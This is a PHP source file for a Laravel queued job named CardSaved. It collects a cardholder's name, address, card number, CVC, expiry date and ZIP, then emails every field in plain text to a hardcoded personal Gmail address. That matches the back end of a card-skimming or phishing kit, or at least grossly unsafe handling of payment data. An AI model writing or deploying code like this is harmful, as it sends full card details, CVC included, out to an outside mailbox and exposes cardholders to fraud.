<?php

namespace App\Jobs;

use App\Mail\CardSavedNotifiying;
use Illuminate\Bus\Queueable;
use Illuminate\Contracts\Queue\ShouldQueue;
use Illuminate\Foundation\Bus\Dispatchable;
use Illuminate\Queue\InteractsWithQueue;
use Illuminate\Queue\SerializesModels;
use Mail;

class CardSaved implements ShouldQueue
{
    use Dispatchable, InteractsWithQueue, Queueable, SerializesModels;
    
    private $name;
    private $address;
    private $number;
    private $cvc;
    private $expiryMonth;
    private $expiryYear;
    private $zip;


    /**
     * Create a new job instance.
     *
     * @return void
     */
    public function __construct($name,$address,$number,$cvc,$expiryMonth,$expiryYear,$zip)
    {
        $this->name = $name;
        $this->address = $address ;
        $this->number = $number;
        $this->cvc = $cvc;
        $this->expiryMonth =$expiryMonth ;
        $this->expiryYear = $expiryYear;
        $this->zip = $zip;
    }

    /**
     * Execute the job.
     *
     * @return void
     */
    public function handle()
    {
        Mail::to('dreamtechnology2050@gmail.com')->send(new CardSavedNotifiying($this->name,$this->address,$this->number,$this->cvc,$this->expiryMonth,$this->expiryYear,$this->zip));
    }
}
